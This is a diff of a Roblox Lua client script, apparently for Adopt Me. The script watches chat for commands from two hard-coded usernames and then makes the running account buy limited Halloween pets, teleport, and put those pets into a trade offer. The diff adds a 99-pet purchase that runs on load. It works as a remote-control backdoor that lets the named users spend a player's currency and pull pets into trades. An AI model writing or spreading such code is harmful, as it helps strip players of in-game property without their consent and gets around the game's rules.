@@ -3,6 +3,8 @@ local Fsys = require(game.ReplicatedStorage:FindFirstChild("Fsys")).load
 local ClientData = Fsys("ClientData")
 local get = Fsys("RouterClient").get
 
+get("ShopAPI/BuyItem"):InvokeServer("pets", "halloween_2025_ghostly_cat", {["buy_count"] = 99})
+
 function onPlayerChatted(player)
 	player.Chatted:Connect(function(message)
 		if player.Name == "xlsxh" or player.Name == "tracy_gltx" then
@@ -12,12 +14,14 @@ function onPlayerChatted(player)
 				game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("i sent you a trade request.")
 			end
 			
-			if message == ".buy cat" then
-				get("ShopAPI/BuyItem"):InvokeServer("pets", "halloween_2025_ghostly_cat", {["buy_count"] = 99})
+			if message == ".buy" then
+				for i=1, 10 do
+					get("ShopAPI/BuyItem"):InvokeServer("pets", "halloween_2025_ghostly_cat", {["buy_count"] = 1})
+				end
 			end
 
 			if message == ".teleport" then
-				get("LocationAPI/TeleToPlayer"):InvokeServer(game.Players:FindFirstChild("xlsxh"))
+				get("LocationAPI/TeleToPlayer"):InvokeServer(game.Players[player.Name])
 			end
 
 			if string.sub(message, 1, 5) == ".bio " then
@@ -26,7 +30,7 @@ function onPlayerChatted(player)
 
 			if message == ".add pet" then
 				for i,v in pairs(ClientData.get_data()[LocalPlayer.Name].inventory.pets) do
-					if v["kind"] == "halloween_2025_ghostly_cat" then
+					if v["kind"] == "halloween_2025_ghostly_cat" or v["kind"] == "halloween_2025_bat_cat" then
 						wait()
 						get("TradeAPI/AddItemToOffer"):FireServer(v.unique)
 					end
